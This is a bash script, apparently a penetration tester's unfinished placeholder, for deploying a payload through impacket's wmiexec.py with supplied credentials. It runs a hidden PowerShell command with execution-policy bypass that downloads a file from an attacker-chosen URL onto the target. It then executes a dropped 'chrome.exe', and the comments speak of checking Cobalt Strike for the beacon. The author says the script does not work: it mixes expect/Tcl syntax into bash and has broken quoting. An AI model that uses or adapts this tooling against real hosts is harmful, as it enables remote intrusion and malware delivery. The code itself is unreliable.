#!/bin/bash

# this is currently a non-working script
# On a recent pentest, I found myself running the same 2 commands over and over again, wanted
# to make a script to do this, but ran into issues. 

# keeping here as a placeholder/todo item. Better yet, turn it into a python script!


## These I borrowed from an expect script. Need to use bash format to collect command-line arguments to pass through. 
set username [lindex $argv 0]
set password [lindex $argv 1]
set hostname [lindex $argv 2]
set download [lindex $argv 3]
set storage [lindex $argv 4]
            # Location of the wmiexec.py script
WMIEXECDIR=/root/scripts/impacket/examples/

            # Here's where the python script gets executed. These variables are passed in from the command line. 
python $WMIEXECDIR/wmiexec.py $username:$password@$hostname "powershell.exe -w hidden -nop -ep bypass -c \"IEX ((new-object net.webclient).downloadfile($download', '$storage'))\""

            # Main problem was here... I couldn't figure out how to inject the extra slashes needed for wmiexec. 
python $WMIEXECDIR/wmiexec.py $WMIEXECDIR c:\\temp\\chrome.exe

## Other todo: Need a "help" that tests for correct arguments and explains the required inputs. 
##              Need to make sure command line output is verbose enough. I've run into this script hanging, and want the user to know 
##              that it's time to check CS for the beacon. 

